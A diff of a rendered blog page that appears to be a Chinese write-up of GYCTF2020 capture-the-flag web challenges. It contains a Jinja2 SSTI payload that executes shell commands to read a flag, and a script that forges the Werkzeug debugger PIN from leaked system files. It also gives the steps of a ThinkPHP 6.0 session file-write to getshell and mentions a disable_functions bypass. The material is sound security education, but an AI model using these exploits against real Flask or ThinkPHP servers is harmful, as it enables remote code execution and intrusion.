@@ -124,7 +124,7 @@
                   
                   &nbsp;<i class="far fa-chart-bar"></i>
                   <span class="post-count">
-                    6.3k 字
+                    6.2k 字
                   </span>&nbsp;
                 
 
@@ -132,7 +132,7 @@
                   
                   &nbsp;<i class="far fa-clock"></i>
                   <span class="post-count">
-                      28 分钟
+                      27 分钟
                   </span>&nbsp;
                 
 
@@ -429,7 +429,8 @@ echo serialize($o);
 </code></pre>
 <pre><code class="python">{{''.__class__.__base__.__subclasses__()[77].__init__.__globals__['sys'].modules['o'+'s'].__dict__['po'+'pen']('cat /this_is_the_fl'+'ag.txt').read()}}
 </code></pre>
-<p>将payload进行base64编码，再在题目中解码触发SSTI进行RCE：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200306172255728.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p>将payload进行base64编码，再在题目中解码触发SSTI进行RCE：</p>
+<p><img src="/2020/03/06/GYCTF2020-Writeup/20200306172255728.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <h4><span id="预期解利用pin码进行rce">预期解：利用PIN码进行RCE</span></h4><p>参考这篇文章：<a href="https://www.anquanke.com/post/id/197602" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197602</a></p>
 <p>要想生成PIN码，我们需要获得下面几个信息，这里就不考虑RCE了，所需要的信息均可以通过读文件来获得：</p>
 <p>（1）服务器运行flask所登录的用户名。通过读取/etc/password可知此值为：<code>flaskweb</code><br><img src="/2020/03/06/GYCTF2020-Writeup/20200306182207863.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>（2）modname的值。一般不变就是<code>flask.app</code></p>
@@ -438,53 +439,76 @@ echo serialize($o);
 <p>（6）机器的id。</p>
 <ul>
 <li>对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在<code>/etc/machine-id</code>或<code>/proc/sys/kernel/random/boot_i</code>，有的系统没有这两个文件。</li>
-<li>对于docker机则读取<code>/proc/self/cgroup</code>，其中第一行的<code>/docker/</code>字符串后面的内容作为机器的id，如下为<code>1834da85a17efb2029d4a9c8e8f71fe40a96862055c636788c9835665e8e3359</code><br><img src="/2020/03/06/GYCTF2020-Writeup/20200306183250928.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>然后用kingkk师傅的exp：<br><code>`</code>python<br>import hashlib<br>from itertools import chain<br>probably_public_bits = [<br>  ‘flaskweb’# username<br>  ‘flask.app’,# modname<br>  ‘Flask’,# getattr(app, ‘<strong>name</strong>‘, getattr(app.<strong>class</strong>, ‘<strong>name</strong>‘))<br>  ‘/usr/local/lib/python3.7/site-packages/flask/app.py’ # getattr(mod, ‘<strong>file</strong>‘, None),<br>]</li>
+<li>对于docker机则读取<code>/proc/self/cgroup</code>，其中第一行的<code>/docker/</code>字符串后面的内容作为机器的id，如下为<code>1834da85a17efb2029d4a9c8e8f71fe40a96862055c636788c9835665e8e3359</code></li>
 </ul>
-<p>private_bits = [<br>    ‘2485410393282’,# str(uuid.getnode()),  /sys/class/net/ens33/address<br>    ‘1834da85a17efb2029d4a9c8e8f71fe40a96862055c636788c9835665e8e3359’# get_machine_id(), /etc/machine-id<br>]</p>
-<p>h = hashlib.md5()<br>for bit in chain(probably_public_bits, private_bits):<br>    if not bit:<br>        continue<br>    if isinstance(bit, str):<br>        bit = bit.encode(‘utf-8’)<br>    h.update(bit)<br>h.update(b’cookiesalt’)</p>
-<p>cookie_name = ‘__wzd’ + h.hexdigest()[:20]</p>
-<p>num = None<br>if num is None:<br>    h.update(b’pinsalt’)<br>    num = (‘%09d’ % int(h.hexdigest(), 16))[:9]</p>
-<p>rv =None<br>if rv is None:<br>    for group_size in 5, 4, 3:<br>        if len(num) % group_size == 0:<br>            rv = ‘-‘.join(num[x:x + group_size].rjust(group_size, ‘0’)<br>                          for x in range(0, len(num), group_size))<br>            break<br>    else:<br>        rv = num</p>
-<p>print(rv)</p>
-<pre><code>得到PIN码：`119-747-372`
-![在这里插入图片描述](GYCTF2020-Writeup/20200306184649989.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70)
-输入PIN后就可以在python终端任意执行代码了：
-![在这里插入图片描述](GYCTF2020-Writeup/202003061846353.png)
-&lt;br&gt;
+<p><img src="/2020/03/06/GYCTF2020-Writeup/20200306183250928.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p>然后用kingkk师傅的exp：</p>
+<pre><code class="python">import hashlib
+from itertools import chain
+probably_public_bits = [
+    &#39;flaskweb&#39;# username
+    &#39;flask.app&#39;,# modname
+    &#39;Flask&#39;,# getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))
+    &#39;/usr/local/lib/python3.7/site-packages/flask/app.py&#39; # getattr(mod, &#39;__file__&#39;, None),
+]
 
-# EasyThinking
-这一题利用的是ThinkPHP6.0任意文件创建漏洞，分析可以参考这篇文章：[ThinkPHP6.0任意文件创建分析](https://www.anquanke.com/post/id/197261)
+private_bits = [
+    &#39;2485410393282&#39;,# str(uuid.getnode()),  /sys/class/net/ens33/address
+    &#39;1834da85a17efb2029d4a9c8e8f71fe40a96862055c636788c9835665e8e3359&#39;# get_machine_id(), /etc/machine-id
+]
 
-简单说就是这个漏洞可以通过session来任意创建文件（文件名可控），并且当session里的数据可控的话，我们就可以控制创建的文件的内容，从而getshell。
+h = hashlib.md5()
+for bit in chain(probably_public_bits, private_bits):
+    if not bit:
+        continue
+    if isinstance(bit, str):
+        bit = bit.encode(&#39;utf-8&#39;)
+    h.update(bit)
+h.update(b&#39;cookiesalt&#39;)
 
-扫描发现/www.zip下载源码，除了注册和登录外还有一个搜索功能，通过源码可以看到我们搜索的值会被写入session中，因此利用我们就可以利用这个漏洞任意创建内容可控的文件：
-![在这里插入图片描述](GYCTF2020-Writeup/20200315115458626.png)
-首先注册一个用户，并在登陆的时候将PHPSESSID的值改为长度为32的php文件名，如`1111111111111111111111111111.php`：
-![在这里插入图片描述](GYCTF2020-Writeup/20200315120241769.png)
-然后在搜索功能中输入文件的内容：
-![在这里插入图片描述](GYCTF2020-Writeup/20200315120711196.png)
-Thinkphp6默认把session文件存在/runtime/session目录下面，并保存为sess_xxx的形式：
-![在这里插入图片描述](GYCTF2020-Writeup/202003151150596.png)
+cookie_name = &#39;__wzd&#39; + h.hexdigest()[:20]
 
-所以访问`/runtime/session/sess_1111111111111111111111111111.php`就是我们写入的文件：
-![在这里插入图片描述](GYCTF2020-Writeup/20200315120918971.png)
+num = None
+if num is None:
+    h.update(b&#39;pinsalt&#39;)
+    num = (&#39;%09d&#39; % int(h.hexdigest(), 16))[:9]
 
-然后就是bypass disable functions了，直接上传&lt;php7.4的通杀POC执行/readflag即可：
-![在这里插入图片描述](GYCTF2020-Writeup/20200315121416838.png)
+rv =None
+if rv is None:
+    for group_size in 5, 4, 3:
+        if len(num) % group_size == 0:
+            rv = &#39;-&#39;.join(num[x:x + group_size].rjust(group_size, &#39;0&#39;)
+                          for x in range(0, len(num), group_size))
+            break
+    else:
+        rv = num
 
-&lt;br&gt;
-
-
-# Node Game
-
-
-&gt; 首先放上出题人的[writeup。](https://blog.5am3.com/2020/02/11/ctf-node1/#%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84-node-game)
-&gt; 
-
-这题给了源码：
-
-```javascript
-var express = require(&#39;express&#39;);
+print(rv)
+</code></pre>
+<p>得到PIN码：<code>119-747-372</code></p>
+<p><img src="/2020/03/06/GYCTF2020-Writeup/20200306184649989.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p>输入PIN后就可以在python终端任意执行代码了：</p>
+<p><img src="/2020/03/06/GYCTF2020-Writeup/202003061846353.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p><br></p>
+<h1><span id="easythinking">EasyThinking</span></h1><p>这一题利用的是ThinkPHP6.0任意文件创建漏洞，分析可以参考这篇文章：<a href="https://www.anquanke.com/post/id/197261" target="_blank" rel="noopener">ThinkPHP6.0任意文件创建分析</a></p>
+<p>简单说就是这个漏洞可以通过session来任意创建文件（文件名可控），并且当session里的数据可控的话，我们就可以控制创建的文件的内容，从而getshell。</p>
+<p>扫描发现/<a href="http://www.zip下载源码，除了注册和登录外还有一个搜索功能，通过源码可以看到我们搜索的值会被写入session中，因此利用我们就可以利用这个漏洞任意创建内容可控的文件：" target="_blank" rel="noopener">www.zip下载源码，除了注册和登录外还有一个搜索功能，通过源码可以看到我们搜索的值会被写入session中，因此利用我们就可以利用这个漏洞任意创建内容可控的文件：</a></p>
+<p><img src="/2020/03/06/GYCTF2020-Writeup/20200315115458626.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p>首先注册一个用户，并在登陆的时候将PHPSESSID的值改为长度为32的php文件名，如<code>1111111111111111111111111111.php</code>：</p>
+<p><img src="/2020/03/06/GYCTF2020-Writeup/20200315120241769.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p>然后在搜索功能中输入文件的内容：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200315120711196.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p>Thinkphp6默认把session文件存在/runtime/session目录下面，并保存为sess_xxx的形式：</p>
+<p><img src="/2020/03/06/GYCTF2020-Writeup/202003151150596.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p>所以访问<code>/runtime/session/sess_1111111111111111111111111111.php</code>就是我们写入的文件：</p>
+<p><img src="/2020/03/06/GYCTF2020-Writeup/20200315120918971.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p>然后就是bypass disable functions了，直接上传&lt;php7.4的通杀POC执行/readflag即可：</p>
+<p><img src="/2020/03/06/GYCTF2020-Writeup/20200315121416838.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p><br></p>
+<h1><span id="node-game">Node Game</span></h1><blockquote>
+<p>首先放上出题人的<a href="https://blog.5am3.com/2020/02/11/ctf-node1/#%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84-node-game" target="_blank" rel="noopener">writeup。</a></p>
+</blockquote>
+<p>这题给了源码：</p>
+<pre><code class="javascript">var express = require(&#39;express&#39;);
 var app = express();
 var fs = require(&#39;fs&#39;);
 var path = require(&#39;path&#39;);
@@ -613,7 +637,8 @@ var server = app.listen(8081, function() {
     var port = server.address().port
     console.log(&quot;Example app listening at http://%s:%s&quot;, host, port)
 })
-</code></pre><p>大概看一下几个路由：</p>
+</code></pre>
+<p>大概看一下几个路由：</p>
 <ul>
 <li>/：会包含/template目录下的一个pug模板文件来用pub进行渲染<ul>
 <li>/source：回显源码</li>
